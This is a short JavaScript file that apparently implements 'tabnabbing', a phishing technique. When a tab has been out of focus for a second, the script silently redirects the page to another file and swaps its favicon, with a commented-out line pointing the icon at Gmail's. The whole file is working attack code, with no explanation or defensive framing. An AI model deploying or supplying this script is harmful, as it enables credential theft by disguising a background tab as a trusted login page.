(function(){

var TIMER = null;
var HAS_SWITCHED = false;

window.onblur = function(){
  TIMER = setTimeout(changeItUp, 1000);
}  

window.onfocus = function(){
  if(TIMER) clearTimeout(TIMER);
}

favicon = {
  docHead: document.getElementsByTagName("head")[0],
  set: function(url){
    this.addLink(url);
  },
  
  addLink: function(iconURL) {
    var link = document.createElement("link");
    link.type = "image/x-icon";
    link.rel = "shortcut icon";
    link.href = iconURL;
    this.removeLinkIfExists();
    this.docHead.appendChild(link);
  },

  removeLinkIfExists: function() {
    var links = this.docHead.getElementsByTagName("link");
    for (var i=0; i<links.length; i++) {
      var link = links[i];
      if (link.type=="image/x-icon" && link.rel=="shortcut icon") {
        this.docHead.removeChild(link);
        return; // Assuming only one match at most.
      }
    }
  },
  
  get: function() {
    var links = this.docHead.getElementsByTagName("link");
    for (var i=0; i<links.length; i++) {
      var link = links[i];
      if (link.type=="image/x-icon" && link.rel=="shortcut icon") {
        return link.href;
      }
    }
  }  
}; 

function createSite(){
  window.location.href = "index2.html";
  var oldFavicon = favicon.get() || "/favicon.ico";
}

function changeItUp(){
  if( HAS_SWITCHED == false ){
    createSite();
    favicon.set("URLHERE/favicon.ico");
//    favicon.set("https://mail.google.com/favicon.ico");
    HAS_SWITCHED = true;    
  }
}
  
})();
